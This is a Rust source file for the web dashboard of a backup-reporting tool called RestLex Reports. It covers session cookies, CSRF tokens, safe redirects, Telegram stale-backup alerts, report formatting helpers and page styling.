/// Возврат «назад» по заголовку Referer. Принимается ТОЛЬКО относительный путь:
/// абсолютный URL превращал удаление отчёта в open redirect на фишинговую
/// копию страницы входа. `//host` и `/\host` браузеры трактуют как
/// protocol-relative — тоже отбрасываем.
fn is_safe_redirect(p: &str) -> bool {
    p.starts_with('/')
        && !p.starts_with("//")
        && !p.starts_with("/\\")
        && !p.contains(['\r', '\n'])
}

fn safe_back(headers: &HeaderMap) -> String {
    headers
        .get("referer")
        .and_then(|v| v.to_str().ok())
        .filter(|s| is_safe_redirect(s))
        .unwrap_or("/")
        .to_string()
}

fn url_enc(s: &str) -> String {
    utf8_percent_encode(s, NON_ALPHANUMERIC).to_string()
}

fn fmt_bytes(lang: Lang, n: i64) -> String {
    let units: [&str; 6] = match lang {
        Lang::Ru => ["Б","КБ","МБ","ГБ","ТБ","ПБ"],
        Lang::En => ["B","KB","MB","GB","TB","PB"],
    };
    let mut v = n as f64;
    for u in &units[..5] {
        if v < 1024.0 {
            return if v.fract() < 0.05 { format!("{} {u}", v as i64) }
                   else { format!("{v:.1} {u}") };
        }
        v /= 1024.0;
    }
    let pb = units[5];
    if v.fract() < 0.05 { format!("{} {pb}", v as i64) } else { format!("{v:.1} {pb}") }
}

fn fmt_dur(lang: Lang, s: i64) -> String {
    let (us, um, uh) = match lang { Lang::Ru => ("с", "м", "ч"), Lang::En => ("s", "m", "h") };
    if s < 60 { return format!("{s}{us}"); }
    let (m, s) = (s / 60, s % 60);
    if m < 60 { return format!("{m}{um} {s:02}{us}"); }
    let (h, m) = (m / 60, m % 60);
    format!("{h}{uh} {m:02}{um}")
}

fn fmt_ts(ts: &str) -> String {
    // По символам, а не по байтам: started_at приходит из JSON агента как есть.
    let ts_owned: String = ts.chars().take(16).collect();
    let ts = ts_owned.as_str();
    let parts: Vec<&str> = ts.splitn(2, |c| c == 'T' || c == ' ').collect();
    if parts.len() == 2 {
        let d: Vec<&str> = parts[0].split('-').collect();
        let t: Vec<&str> = parts[1].splitn(2, ':').collect();
        if d.len() == 3 {
            let h = t.first().unwrap_or(&"0").trim_start_matches('0');
            let h = if h.is_empty() { "0" } else { h };
            let m = t.get(1).unwrap_or(&"00");
            return format!("{}/{}/{} {}:{}", d[2], d[1], d[0], h, m);
        }
    }
    ts.to_string()
}

/// Naive → Local без паники. `and_local_timezone(..).unwrap()` падал на
/// `LocalResult::None` (несуществующее локальное время в час перехода на летнее)
/// — а строка приходит из отчёта агента, т.е. паникой управляет клиент.
fn naive_to_local(d: chrono::NaiveDateTime) -> Option<chrono::DateTime<chrono::Local>> {
    use chrono::offset::LocalResult;
    match d.and_local_timezone(chrono::Local) {
        LocalResult::Single(x) => Some(x),
        LocalResult::Ambiguous(earliest, _) => Some(earliest),
        LocalResult::None => None,
    }
}

fn fmt_stale(lang: Lang, ts: &str, stale_hours: f64) -> String {
    if stale_hours <= 0.0 { return "—".to_string(); }
    let ts_c_owned: String = ts.chars().take(19).collect();
    let ts_c = ts_c_owned.as_str();
    let dt = chrono::DateTime::parse_from_rfc3339(ts)
        .map(|d| d.with_timezone(&chrono::Local))
        .ok()
        .or_else(|| chrono::NaiveDateTime::parse_from_str(ts_c, "%Y-%m-%dT%H:%M:%S")
            .ok()
            .and_then(naive_to_local));
    let Some(dt) = dt else { return "—".to_string(); };
    let age_secs = (chrono::Local::now() - dt).num_seconds();
    let rem = (stale_hours * 3600.0) as i64 - age_secs;
    if rem <= 0 { t(lang, "⚠ просрочен").to_string() }
    else { format!("{}:{:02}", rem / 3600, (rem % 3600) / 60) }
}

fn badge(lang: Lang, status: &str, errors_json: &str) -> String {
    let (icon, label, cls) = match status {
        "success" => ("✅", "Ok",    "badge-ok"),
        "error"   => ("⚠️",  "Error", "badge-error badge-click"),
        "failed"  => ("❌", "Fatal", "badge-failed badge-click"),
        "cancelled" => ("⏹", t(lang, "Прерван"), "badge-cancelled"),
        _         => ("●",  status,  "badge-ok"),
    };
    // label для неизвестного статуса — это строка из отчёта агента; в HTML она
    // обязана уходить только экранированной.
    let label = esc(label);
    let label = label.as_str();
    if (status == "error" || status == "failed") && errors_json != "[]" {
        let errs_esc = esc(errors_json);
        let title = esc(&format!("{icon} {label}"));
        let hint = t(lang, "Нажмите для деталей");
        format!(r#"<span class="badge {cls}" data-errors="{errs_esc}" data-title="{title}" title="{hint}">{icon} {label} &#x2139;</span>"#)
    } else {
        format!(r#"<span class="badge {cls}">{icon} {label}</span>"#)
    }
}

fn launcher_version() -> String {
    std::fs::read_to_string(restlex_core::program_data().join("launcher.version"))
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "?".into())
}

/// (gui, agent) — released versions read from local update-server's versions.json.
/// Cached for 30 sec. Returns ("?","?") if file missing/unreadable.
fn released_versions() -> (String, String) {
    use std::sync::OnceLock;
    use std::time::Instant;
    static CACHE: OnceLock<Mutex<Option<(Instant, String, String)>>> = OnceLock::new();
    let cache = CACHE.get_or_init(|| Mutex::new(None));
    if let Ok(g) = cache.lock() {
        if let Some((t, gui, agent)) = g.as_ref() {
            if t.elapsed() < Duration::from_secs(30) {
                return (gui.clone(), agent.clone());
            }
        }
    }
    // Resolve UPD folder: read update-server.json (which has `folder`),
    // fallback to ProgramData\upd.
    let pd = restlex_core::program_data();
    let upd_dir: PathBuf = std::fs::read_to_string(pd.join("update-server.json"))
        .ok()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .and_then(|v| v.get("folder").and_then(|x| x.as_str()).map(PathBuf::from))
        .unwrap_or_else(|| pd.join("upd"));
    let path = upd_dir.join("versions.json");
    let (gui, agent) = std::fs::read_to_string(&path).ok()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .map(|v| (
            v.get("gui").and_then(|x| x.as_str()).unwrap_or("?").to_string(),
            v.get("agent").and_then(|x| x.as_str()).unwrap_or("?").to_string(),
        ))
        .unwrap_or_else(|| ("?".into(), "?".into()));
    if let Ok(mut g) = cache.lock() {
        *g = Some((Instant::now(), gui.clone(), agent.clone()));
    }
    (gui, agent)
}

fn count_update_errors(db: &Connection, username: &str) -> i64 {
    db.query_row("SELECT COUNT(*) FROM update_reports WHERE success=0 AND id > COALESCE((SELECT last_seen_id FROM update_view_state WHERE username=?1),0)",
        params![username], |r| r.get(0)).unwrap_or(0)
}

fn mark_updates_seen(db: &Connection, username: &str) -> rusqlite::Result<()> {
    let last_id: i64 = db.query_row("SELECT COALESCE(MAX(id),0) FROM update_reports", [], |r| r.get(0))?;
    db.execute("INSERT INTO update_view_state(username,last_seen_id) VALUES(?1,?2) \
        ON CONFLICT(username) DO UPDATE SET last_seen_id=excluded.last_seen_id \
        WHERE excluded.last_seen_id > update_view_state.last_seen_id", params![username, last_id])?;
    Ok(())
}

fn load_collapsed_groups(db: &Connection, username: &str) -> HashSet<String> {
    let json: String = db.query_row("SELECT collapsed_groups FROM user_ui_state WHERE username=?1",
        params![username], |r| r.get(0)).unwrap_or_else(|_| "[]".into());
    serde_json::from_str::<Vec<String>>(&json).unwrap_or_default().into_iter().collect()
}

fn store_collapsed_groups(db: &Connection, username: &str, groups: &[String]) -> rusqlite::Result<()> {
    let json = serde_json::to_string(groups).map_err(|e| rusqlite::Error::ToSqlConversionFailure(Box::new(e)))?;
    db.execute("INSERT INTO user_ui_state(username,collapsed_groups) VALUES(?1,?2) \
        ON CONFLICT(username) DO UPDATE SET collapsed_groups=excluded.collapsed_groups",
        params![username, json])?;
    Ok(())
}

fn load_theme(db: &Connection, username: &str) -> &'static str {
    let theme: String = db.query_row("SELECT theme FROM user_ui_state WHERE username=?1",
        params![username], |r| r.get(0)).unwrap_or_default();
    if theme == "graphite" { "graphite" } else { "light" }
}

fn store_theme(db: &Connection, username: &str, theme: &str) -> rusqlite::Result<()> {
    db.execute("INSERT INTO user_ui_state(username,theme) VALUES(?1,?2) \
        ON CONFLICT(username) DO UPDATE SET theme=excluded.theme", params![username, theme])?;
    Ok(())
}

/// Переключатель RU | EN: обычные ссылки на /lang/{ru|en} — работает без JS.
fn lang_switch(lang: Lang, class: &str) -> String {
    let item = |l: Lang, label: &str| {
        let cur = if l == lang { r#" aria-current="true" style="font-weight:700""# } else { "" };
        format!(r#"<a class="{class}" href="/lang/{}" hreflang="{}"{cur}>{label}</a>"#, l.code(), l.code())
    };
    format!(r#"<span class="nav-lang" role="group" aria-label="{}">{}|{}</span>"#,
        t(lang, "Язык"), item(Lang::Ru, "RU"), item(Lang::En, "EN"))
}

fn nav(lang: Lang, is_admin: bool, extra: &str, filters: &str, upd_err_count: i64, theme: &str, csrf: &str) -> String {
    let admin_lnk = if is_admin { t(lang, r#"<a class="nav-link" href="/admin">⚙ Админка</a>"#) } else { "" };
    let upd_link = if upd_err_count > 0 {
        fill(t(lang, r#"<a class="nav-link" href="/updates">🔄 Обновления <span class="nav-count">{n}</span></a>"#),
            &[("n", &upd_err_count.to_string())])
    } else {
        t(lang, r#"<a class="nav-link" href="/updates">🔄 Обновления</a>"#).to_string()
    };
    let (gui, agent) = released_versions();
    let light_selected = if theme == "graphite" { "" } else { " selected" };
    let graphite_selected = if theme == "graphite" { " selected" } else { "" };
    let tools = if filters.is_empty() { String::new() } else { format!(r#"<div class="nav-tools">{filters}</div>"#) };
    fill(t(lang, r#"<nav class="topbar"><div class="nav-main"><div class="nav-identity"><a class="brand" href="/">&#x1f6e1; RestLex Reports</a></div><div class="nav-versions" aria-label="Версии"><span class="nav-version">Launcher <strong id="nav-launcher-ver">{gui}</strong></span><span class="nav-version">Service <strong id="nav-service-ver">{agent}</strong></span><span class="nav-version">Web <strong>{web}</strong></span></div><div class="nav-actions">{extra}{upd_link}{admin_lnk}<label class="nav-theme">Тема <select class="theme-select" id="theme-select" aria-label="Тема интерфейса" data-csrf="{csrf}" onchange="setTheme(this.value)"><option value=light{light_selected}>Светлая</option><option value=graphite{graphite_selected}>Графит</option></select></label>{lang_switch}<a class="nav-link" href="/logout">Выйти</a></div></div>{tools}</nav>"#),
        &[("gui", &esc(&gui)), ("agent", &esc(&agent)), ("web", env!("CARGO_PKG_VERSION")),
          ("extra", extra), ("upd_link", &upd_link), ("admin_lnk", admin_lnk), ("csrf", &esc(csrf)),
          ("light_selected", light_selected), ("graphite_selected", graphite_selected),
          ("lang_switch", &lang_switch(lang, "nav-link")), ("tools", &tools)])
}

/// Ссылка «← Главная» для меню внутренних страниц.
fn nav_home(lang: Lang) -> &'static str {
    t(lang, r#"<a class="nav-link" href="/">&#x2190; Главная</a>"#)
}

fn flash_html(lang: Lang, fl: &str) -> &'static str {
    let ru = match fl {
        "ok_s"      => r#"<div class="flash flash-ok">&#x2705; Настройки сохранены</div>"#,
        "ok_g"      => r#"<div class="flash flash-ok">&#x2705; Группа добавлена</div>"#,
        "ok_d"      => r#"<div class="flash flash-ok">&#x2705; Группа удалена</div>"#,
        "ok_tg"     => r#"<div class="flash flash-ok">&#x2705; Telegram — сообщение отправлено</div>"#,
        "err_tg"    => r#"<div class="flash flash-err">&#x274c; Telegram — ошибка отправки</div>"#,
        "err_tg_cfg"=> r#"<div class="flash flash-err">&#x274c; Заполните Bot Token и Chat ID</div>"#,
        "ok_unlock" => r#"<div class="flash flash-ok">&#x2705; Блокировки сняты</div>"#,
        "err"       => r#"<div class="flash flash-err">&#x274c; Ошибка</div>"#,
        _           => "",
    };
    t(lang, ru)
}

// ── Auth (cookies) ────────────────────────────────────────────────────────────

fn get_session_token(headers: &HeaderMap) -> Option<String> {
    let cookie_hdr = headers.get(header::COOKIE)?.to_str().ok()?;
    for part in cookie_hdr.split(';') {
        let mut kv = part.trim().splitn(2, '=');
        if kv.next()?.trim() == "session" {
            return Some(kv.next()?.trim().to_string());
        }
    }
    None
}

fn session_token_hash(token: &str) -> String {
    use sha2::Digest;
    hex::encode(&Sha256::digest(token.as_bytes()))
}

fn persist_session(db: &Connection, token: &str, e: &SessionEntry) -> rusqlite::Result<()> {
    db.execute("INSERT INTO web_sessions(token_hash,username,role,csrf,created,last_seen) VALUES(?1,?2,?3,?4,?5,?6)",
        params![session_token_hash(token), e.username, e.role, e.csrf, e.created, e.last_seen])?;
    Ok(())
}

fn db_credential_unchanged(db: &Connection, username: &str, expected_hash: &str, expected_role: &str) -> bool {
    let current: rusqlite::Result<(String, String)> = db.query_row(
        "SELECT password,role FROM users WHERE username=?1",
        params![username],
        |r| Ok((r.get(0)?, r.get(1)?)),
    );
    matches!(current, Ok((hash, role)) if hash == expected_hash && role == expected_role)
}

fn upgrade_password_if_unchanged(db: &Connection, username: &str, old_hash: &str, new_hash: &str) -> bool {
    matches!(db.execute(
        "UPDATE users SET password=?1 WHERE username=?2 AND password=?3",
        params![new_hash, username, old_hash],
    ), Ok(1))
}

/// Протухла ли запись по времени бездействия.
fn session_expired(e: &SessionEntry, now: i64) -> bool {
    now.saturating_sub(e.last_seen) >= SESSION_TTL_SECS
        || now.saturating_sub(e.created) >= SESSION_ABS_MAX_SECS
}

/// Живая (не протухшая) запись сессии; протухшая удаляется прямо здесь.
fn session_entry(state: &AppState, headers: &HeaderMap) -> Option<SessionEntry> {
    let token = get_session_token(headers)?;
    let now = now_unix();
    let mut sessions = state.sessions.lock().unwrap();
    let mut e = sessions.get(&token).cloned()?;
    if session_expired(&e, now) {
        sessions.remove(&token);
        return None;
    }
    e.last_seen = now;
    sessions.insert(token, e.clone());
    Some(e)
}

// Восстановление сессии с диска допускается только в блокирующей задаче middleware.
fn load_session_entry(state: &AppState, headers: &HeaderMap) -> Option<SessionEntry> {
    let token = get_session_token(headers)?;
    let now = now_unix();
    // Отдельный gate покрывает чтение SQLite и вставку в кэш. Общий кэш не
    // держим на дисковом I/O: async-обработчики читают его напрямую.
    let _gate = state.session_gate.lock().unwrap();
    let cached = state.sessions.lock().unwrap().get(&token).cloned();
    let mut e = if let Some(e) = cached { e } else {
        if token.len() != 64 || !token.bytes().all(|b| b.is_ascii_hexdigit()) { return None; }
        if !state.session_db_path().exists() { return None; }
        let db = state.session_db().ok()?;
        db.query_row("SELECT username,role,csrf,created,last_seen FROM web_sessions WHERE token_hash=?1",
            params![session_token_hash(&token)], |r| Ok(SessionEntry {
                username: r.get(0)?, role: r.get(1)?, csrf: r.get(2)?,
                created: r.get(3)?, last_seen: r.get(4)?,
            })).ok()?
    };
    if session_expired(&e, now) {
        state.sessions.lock().unwrap().remove(&token);
        if state.session_db_path().exists() {
            if let Ok(db) = state.session_db() {
                let _ = db.execute("DELETE FROM web_sessions WHERE token_hash=?1", params![session_token_hash(&token)]);
            }
        }
        return None;
    }
    e.last_seen = now;
    state.sessions.lock().unwrap().insert(token, e.clone());
    Some(e)
}

/// Продлеваем cookie живой сессии вместе с серверным временем активности.
fn renew_session_cookie(state: &AppState, headers: &HeaderMap, secure: bool) -> Option<String> {
    let token = get_session_token(headers)?;
    let entry = load_session_entry(state, headers)?;
    let left = SESSION_ABS_MAX_SECS.saturating_sub(now_unix().saturating_sub(entry.created));
    (left > 0).then(|| set_session_cookie(&token, secure, SESSION_TTL_SECS.min(left)))
}

/// Middleware: на каждом запросе живой сессии дописывает свежий Set-Cookie,
/// если ответ его ещё не ставит (login/logout ставят свой).
async fn session_refresh_mw(
    State(st): State<AppState>,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> Response {
    let secure = st.cfg().behind_tls;
    let headers = req.headers().clone();
    let st_for_load = st.clone();
    let cookie = tokio::task::spawn_blocking(move || renew_session_cookie(&st_for_load, &headers, secure))
        .await.unwrap_or(None);
    let token = if cookie.is_some() { get_session_token(req.headers()) } else { None };
    let mut resp = next.run(req).await;
    if let Some(token) = token {
        let _ = tokio::task::spawn_blocking(move || {
            if let Ok(db) = st.session_db() {
                let _ = db.execute("UPDATE web_sessions SET last_seen=?1 WHERE token_hash=?2",
                    params![now_unix(), session_token_hash(&token)]);
            }
        }).await;
    }
    if let Some(c) = cookie {
        if !resp.headers().contains_key(header::SET_COOKIE) {
            if let Ok(v) = c.parse() { resp.headers_mut().insert(header::SET_COOKIE, v); }
        }
    }
    resp
}

/// Сбрасывает все сессии пользователя. Роль кешируется в `SessionEntry`, и без
/// этого понижённый (или удалённый) админ оставался админом до конца TTL.
#[cfg(test)]
fn drop_user_sessions(state: &AppState, username: &str) -> bool {
    if username.is_empty() { return true; }
    let _gate = state.session_gate.lock().unwrap();
    drop_user_sessions_locked(state, username)
}

/// Caller уже держит session_gate на весь переход полномочий пользователя.
fn drop_user_sessions_locked(state: &AppState, username: &str) -> bool {
    if username.is_empty() { return true; }
    if state.session_db_path().exists() {
        let Ok(db) = state.session_db() else { return false };
        if db.execute("DELETE FROM web_sessions WHERE username=?1", params![username]).is_err() { return false; }
    }
    state.sessions.lock().unwrap().retain(|_, e| e.username != username);
    true
}

fn get_role(state: &AppState, headers: &HeaderMap) -> Option<String> {
    session_entry(state, headers).map(|e| e.role)
}

/// CSRF-токен текущей сессии — кладётся скрытым полем в admin-формы.
fn csrf_token(state: &AppState, headers: &HeaderMap) -> String {
    session_entry(state, headers).map(|e| e.csrf).unwrap_or_default()
}

/// Синхронизирующий токен: значение из формы обязано совпасть с токеном сессии.
fn csrf_ok(state: &AppState, headers: &HeaderMap, got: Option<&str>) -> bool {
    let Some(got) = got.map(str::trim).filter(|s| !s.is_empty()) else { return false };
    match session_entry(state, headers) {
        Some(e) if !e.csrf.is_empty() => hmac_eq(e.csrf.as_bytes(), got.as_bytes()),
        _ => false,
    }
}

/// Скрытое поле для admin-форм.
fn csrf_field(tok: &str) -> String {
    format!(r#"<input type=hidden name=csrf value="{}">"#, esc(tok))
}

fn is_admin(state: &AppState, headers: &HeaderMap) -> bool {
    get_role(state, headers).as_deref() == Some("admin")
}

fn is_viewer(state: &AppState, headers: &HeaderMap) -> bool {
    matches!(get_role(state, headers).as_deref(), Some("admin") | Some("viewer"))
}

fn new_session_token() -> String {
    use rand::Rng;
    let bytes: [u8; 32] = rand::thread_rng().gen();
    hex::encode(&bytes)
}

fn set_session_cookie(token: &str, secure: bool, max_age: i64) -> String {
    // HttpOnly уже был; Secure добавляется только при behind_tls — иначе браузер
    // выбросит cookie на текущих HTTP-установках и вход перестанет работать.
    let sec = if secure { "; Secure" } else { "" };
    format!("session={token}; Path=/; HttpOnly; SameSite=Strict; Max-Age={max_age}{sec}")
}

fn clear_session_cookie() -> &'static str {
    "session=; Path=/; HttpOnly; SameSite=Strict; Max-Age=0"
}

// hex encode (no dep needed — we have sha2 already)
mod hex {
    pub fn encode(b: &[u8]) -> String {
        b.iter().map(|x| format!("{x:02x}")).collect()
    }
    pub fn decode(s: &str) -> Result<Vec<u8>, ()> {
        if s.len() % 2 != 0 { return Err(()); }
        (0..s.len()).step_by(2)
            .map(|i| u8::from_str_radix(&s[i..i+2], 16).map_err(|_| ()))
            .collect()
    }
}

// ── Telegram ──────────────────────────────────────────────────────────────────

/// Экранирование для parse_mode=HTML Telegram. Поддерживаются только эти
/// сущности, поэтому esc() (с &#39;) сюда не годится.
fn tg_esc(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;")
}

async fn tg_broadcast(cfg: &Config, text: &str) {
    if cfg.tg_token.is_empty() || cfg.tg_chat.is_empty() { return; }
    // Тот же гард, что у admin_password/api_key: нерасшифрованный `enc:`-блоб
    // нельзя слать как bot-token — Telegram молча отвечал 404 и алерты пропадали.
    if restlex_core::crypto::is_undecrypted(&cfg.tg_token) {
        tracing::warn!("telegram: tg_token не расшифрован (DPAPI) — оповещение не отправлено");
        return;
    }
    let thread = if cfg.tg_group.is_empty() { None } else { Some(cfg.tg_group.as_str()) };
    // Результат раньше глушился `let _ =`: Telegram отвечал 400 «can't parse
    // entities», и оповещение терялось молча — ровно в том случае, ради которого
    // фича написана.
    if let Err(e) = restlex_core::telegram::send_threaded(&cfg.tg_token, &cfg.tg_chat, text, thread).await {
        tracing::warn!("telegram: отправка не удалась: {e}");
    }
}

// ── Stale check ───────────────────────────────────────────────────────────────

async fn stale_loop(state: AppState) {
    let mut notified: HashMap<String, chrono::DateTime<chrono::Local>> = HashMap::new();
    loop {
        tokio::time::sleep(Duration::from_secs(1800)).await;
        let cfg = state.cfg();
        let stale_h = cfg.stale_hours;
        if stale_h <= 0.0 || cfg.tg_token.is_empty() || cfg.tg_chat.is_empty() { continue; }
        let db_state = state.clone();
        let Ok(Ok(rows)) = tokio::task::spawn_blocking(move || -> rusqlite::Result<Vec<(String, String)>> {
            let db = db_state.db()?;
            let mut stmt = db.prepare("SELECT profile, MAX(received_at) AS last FROM reports GROUP BY profile")?;
            let rows = stmt.query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)))?
                .collect::<rusqlite::Result<Vec<_>>>()?;
            Ok(rows)
        }).await else { continue };
        let now = chrono::Local::now();
        for (profile, last_str) in rows {
            // Паника здесь убивала фоновую задачу целиком — Telegram-алерты о
            // молчащих профилях не приходили до перезапуска службы.
            let Some(last_dt) = chrono::DateTime::parse_from_rfc3339(&last_str)
                .map(|d| d.with_timezone(&chrono::Local))
                .ok()
                .or_else(|| {
                    chrono::NaiveDateTime::parse_from_str(&last_str, "%Y-%m-%dT%H:%M:%S%.f")
                        .ok()
                        .and_then(naive_to_local)
                })
            else { continue };
            let age_h = (now - last_dt).num_seconds() as f64 / 3600.0;
            if age_h < stale_h { continue; }
            if let Some(prev) = notified.get(&profile) {
                if (now - *prev).num_seconds() as f64 / 3600.0 < stale_h { continue; }
            }
            let last_short: String = last_str.chars().take(16).collect();
            let msg = format!(
                "[RestLex] Устаревший бэкап: <b>{}</b>\nПоследний отчёт: {} ({:.0}ч назад)\nДопустимое устаревание: {stale_h:.0}ч",
                tg_esc(&profile), tg_esc(&last_short), age_h
            );
            tg_broadcast(&cfg, &msg).await;
            notified.insert(profile, now);
        }
    }
}

// ── Resolve group ─────────────────────────────────────────────────────────────

fn resolve_group(db: &Connection, profile: &str, auto_group: bool) -> Option<i64> {
    let rows: Vec<(i64, String)> = db.prepare(
        "SELECT id, pattern FROM groups WHERE pattern != '' ORDER BY auto_created ASC, sort_order ASC"
    ).ok()?.query_map([], |r| Ok((r.get(0)?, r.get(1)?))).ok()?.flatten().collect();

    for (id, pat) in &rows {
        if pat.len() > 200 { continue; }
        if let Ok(re) = regex::Regex::new(pat) {
            if re.is_match(&profile[..profile.len().min(500)]) { return Some(*id); }
        }
    }
    if !auto_group { return None; }
    let cap = regex::Regex::new(r"^([^-]+)-").ok()?.captures(profile)?;
    let prefix = cap.get(1)?.as_str();
    if let Ok(id) = db.query_row("SELECT id FROM groups WHERE name = ?1", params![prefix], |r| r.get::<_,i64>(0)) {
        return Some(id);
    }
    let pat = format!("^{}-", regex::escape(prefix));
    db.execute("INSERT INTO groups(name,pattern,auto_created) VALUES(?1,?2,1)", params![prefix, pat]).ok()?;
    Some(db.last_insert_rowid())
}

// ── HTML constants ────────────────────────────────────────────────────────────

const CSS: &str = r#"<style>
:root{--blue:#2563eb;--dark:#1a1a2e;--navy:#1e3a5f;--gray:#64748b;--border:#e2e8f0}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#f6f8fb;color:var(--dark);font-size:.92rem}
@keyframes page-refresh-line{0%{width:0;opacity:1}85%{width:100%;opacity:1}100%{width:100%;opacity:0}}
body::after{content:'';position:fixed;top:0;left:0;z-index:10000;height:3px;background:#38bdf8;
  box-shadow:0 0 8px #38bdf899;pointer-events:none;animation:page-refresh-line 1.35s ease-out both}
a{color:inherit;text-decoration:none}
nav.topbar{background:#1c2938;color:#e8f0f8}
.nav-main{max-width:1440px;margin:auto;padding:8px 16px;display:flex;align-items:center;gap:12px;min-height:54px;flex-wrap:wrap}
.nav-identity{padding-right:13px;border-right:1px solid #506176}
nav .brand{display:inline-flex;align-items:center;min-height:32px;color:#f8fafc;font-size:.8rem;font-weight:700;white-space:nowrap}
.nav-versions,.nav-actions{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.nav-actions{margin-left:auto}
.nav-version,.nav-theme,.nav-link{display:inline-flex;align-items:center;gap:6px;min-height:32px;padding:0 10px;border:1px solid #52657b;border-radius:5px;background:#26374b;color:#dbe7f3;font-size:.8rem;font-weight:500;line-height:1.2;white-space:nowrap}
.nav-version strong{color:#fff;font-size:.8rem;font-weight:700}
.nav-count{display:inline-flex;align-items:center;justify-content:center;min-width:18px;padding:1px 5px;border-radius:9px;background:#dc2626;color:#fff;font-size:.8rem;font-weight:700}
.nav-link:hover{color:#fff;background:#354b64;border-color:#8298af}
.theme-select{padding:2px 4px;background:transparent;color:#fff;border:0;font:600 .8rem system-ui,sans-serif;cursor:pointer}
.nav-tools{border-top:1px solid #46586d;background:#243347}
.nav-back{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;background:#fff;border:1px solid var(--border);border-radius:6px;color:var(--navy);font-weight:600;font-size:.86rem;margin-bottom:14px;box-shadow:0 1px 3px #0001}
.nav-back:hover{background:#f1f5f9}
.filter-strip{background:#fff;color:#475569;padding:8px max(12px,calc((100vw - 1400px)/2 + 12px));display:flex;align-items:center;gap:7px;flex-wrap:wrap;border-bottom:1px solid #dbe4ee;box-shadow:0 1px 2px #1e3a5f0a}
.filter-strip-label{font-size:.8rem;font-weight:600;margin-right:4px}
.filter-chip{border:1px solid #cbd5e1;background:#fff;color:#475569;border-radius:5px;padding:4px 10px;font:600 .8rem system-ui,sans-serif;cursor:pointer;white-space:nowrap}
.filter-chip:hover{background:#f1f5f9;border-color:#94a3b8}
.filter-chip.active{background:#eaf2ff;color:#1d4ed8;border-color:#93b4e8}
.filter-collapse{margin-left:auto}
.filter-count,.filter-updated{font-size:.8rem;color:#64748b;white-space:nowrap}
.filter-meta{display:inline-flex;align-items:center;gap:12px;margin-left:auto;padding-left:12px;border-left:1px solid #60718a;flex-wrap:wrap}
#updates-filters .filter-count{margin-left:auto}
nav .filter-strip{max-width:1440px;margin:auto;min-width:0;padding:7px 16px;background:transparent;color:#d7e4f2;border:0;box-shadow:none}
nav .filter-chip{background:#263449;color:#e2e8f0;border-color:#60718a}
nav .filter-chip:hover{background:#35465e;border-color:#93a9c5}
nav .filter-chip.active{background:#dbeafe;color:#1e3a5f;border-color:#dbeafe}
nav .filter-count{color:#adbed1}
nav .filter-updated{color:#adbed1}
nav .filter-collapse{margin-left:4px}
#updates-filters .filter-count{margin-left:auto}
.sortable{cursor:pointer;user-select:none}.sortable:hover{background:rgba(255,255,255,.08)}
.sortable.asc::after{content:" ▲";font-size:.7em}.sortable.desc::after{content:" ▼";font-size:.7em}
.admin-tabs{display:flex;gap:2px;margin:0 0 0 0;border-bottom:2px solid var(--border)}
.atab{background:transparent;border:none;padding:8px 16px;font-size:.88rem;font-family:inherit;cursor:pointer;color:#64748b;border-bottom:2px solid transparent;margin-bottom:-2px;font-weight:500;transition:.15s}
.atab:hover{color:var(--navy);background:#f8fafc}
.atab.active{color:var(--blue);border-bottom-color:var(--blue);font-weight:600}
.container{max-width:1400px;margin:12px auto;padding:0 12px}
.page-title{font-size:1.05rem;font-weight:700;color:var(--navy);margin-bottom:16px;display:flex;align-items:center;gap:10px}
.history-heading{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:12px}
.history-heading .page-title{margin-bottom:0}
.history-heading form{margin:0}
.toolbar{display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:5px;padding:5px 14px;border-radius:5px;font-size:.83rem;border:1px solid var(--border);background:#fff;color:#374151;cursor:pointer;font-family:inherit;line-height:1.5;white-space:nowrap}
.btn:hover{background:#f1f5f9}
.btn-blue{background:var(--blue);color:#fff;border-color:var(--blue)}
.btn-blue:hover{background:#1d4ed8}
.btn-sm{padding:2px 9px;font-size:.78rem}
.group{background:#fff;border:1px solid #dfe6ee;border-radius:7px;box-shadow:0 1px 2px #1e3a5f0d;margin-bottom:8px;overflow:hidden}
.group-hdr{background:#fff;color:#24364b;padding:7px 12px;display:flex;align-items:center;gap:6px;border-left:3px solid #9bbbe2}
.group-hdr:hover{background:#f7faff}
.group-hdr.gray{background:#f9fafb;color:#64748b;border-left-color:#cbd5e1}
.group-hdr h2{font-size:.83rem;font-weight:650}
.group-toggle{border:0;background:transparent;color:inherit;font:inherit;cursor:pointer;text-align:left;padding:2px 4px;border-radius:4px}
.group-toggle:hover{color:#1d4ed8}
.group-toggle:focus-visible{outline:2px solid #2563eb;outline-offset:2px}
.group-toggle::before{content:'▾';display:inline-block;width:18px;font-size:1rem}
.group.collapsed .group-toggle::before{content:'▸'}
.group.collapsed .tbl-wrap{display:none}
.group.has-problems .group-hdr,.group.has-problems .group-hdr:hover{background:#fff8ee;color:#92400e;border-left-color:#f59e0b}
.group-problems{margin-left:auto;background:#ffedd5;color:#9a3412;border:1px solid #fed7aa;border-radius:10px;padding:2px 9px;font-size:.72rem;font-weight:700;white-space:nowrap}
.group-problems[hidden]{display:none}
.tbl-wrap{overflow-x:auto}
table{width:100%;border-collapse:collapse;table-layout:fixed}
col.c-profile{width:15%}col.c-host{width:9%}col.c-status{width:96px}
col.c-time{width:130px}col.c-dur{width:60px}col.c-added{width:82px}
col.c-src{width:82px}col.c-files{width:72px}col.c-snap{width:82px}col.c-ver{width:120px}col.c-group{width:80px}col.c-action{width:96px}col.c-action-h{width:44px}
.report-table{min-width:1220px}
.report-actions{display:flex;align-items:center;justify-content:flex-end;gap:6px}
.report-actions form{margin:0}
.action-delete-all{height:28px;padding:2px 8px;justify-content:center;color:#b91c1c;border-color:#fca5a5;font-size:.78rem}
.action-delete-all:hover{background:#fef2f2}
